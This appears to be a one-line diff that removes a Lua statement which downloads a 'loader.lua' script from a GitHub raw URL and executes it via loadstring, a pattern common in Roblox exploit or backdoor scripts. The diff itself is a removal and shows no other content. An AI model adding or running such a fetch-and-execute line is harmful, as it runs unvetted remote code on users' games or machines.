@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kdmrich63-arch/script/refs/heads/main/loader.lua"))()
